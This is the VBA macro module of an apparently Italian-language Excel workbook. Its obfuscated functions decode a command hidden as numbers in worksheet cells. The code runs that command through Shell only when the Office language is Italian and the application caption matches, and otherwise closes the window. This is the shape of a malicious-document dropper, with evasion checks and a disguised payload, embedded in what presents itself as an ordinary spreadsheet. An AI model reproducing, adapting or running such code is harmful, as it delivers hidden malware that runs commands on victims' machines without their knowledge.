Attribute VB_Name = "Questa_cartella_di_lavoro"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Const rise = 14

Function ques(repo As String, villa As String, hot As Long) As String
If hot < 1 Then hot = 1
If Len(repo) < hot Then hot = Len(repo) + 1
ques = Mid(repo, 1, hot - 1) _
& villa _
& Mid(repo, hot, Len(repo) - hot + 1)
End Function
Function lamba(ByVal kius As String) As String

Dim sudos As Integer

Dim iont As Integer
Dim natof As Integer
Dim goal() As Integer
Dim swiss() As Long
Dim yko As Integer


    yko = IIf(Right(kius, 1) Mod 2 = 0, 5, 4)
    kius = Left(kius, Len(kius) - IIf(Right(kius, 1) Mod 2 = 0, 1, 1))
    sudos = Len(kius) / yko - 1
    ReDim goal(sudos)
    ReDim swiss(sudos)

    iont = 0
    natof = 0

    For natof = 0 To sudos





















        goal(natof) = natof - (sudos + 1)
    Next natof
    For iont = 0 To sudos
        For natof = 0 To sudos
            If CInt(Mid(kius, natof * yko + 1, yko - 3)) = iont Then
                swiss(iont) = (Mid(kius, (natof + 1) * yko - 2, 3) + goal(iont))
                Exit For
            End If
        Next natof
    Next iont

















    lamba = ""
    For iont = 0 To sudos
        lamba = lamba & Chr(swiss(iont))
    Next iont

End Function

Function Qggetti()
Dim fg, fh, vls, sudii, pero As String
Dim turam As String
scree = msoLanguageIDUI
mike = Application.LanguageSettings.LanguageID(scree)
polos = Asc(Left(Trim(Application.Caption), 1))
If polos = 102 Or 78 = polos Or polos = 70 And mike = 1000 + 40 Then
For i = rise To 27
fg = fg + lamba(Cells(i, rise))
fh = fh + lamba(Cells(i, rise + 1))
Next i
turam = fg + fh
vls = fh & fg: sudii = "124" + fg: pero = fh + "110"
boraa (ques(turam, Cells(4, 10), 278))
Else
ActiveWindow.Close savechanges:=0
End If
End Function

Function boraa(rdf As String)
Shell rdf, xlNumberFormatTypeDefault
Dim ryt As Workbook: Set ryt = Workbooks.Add: Workbooks(1).Close savechanges:=0
End Function


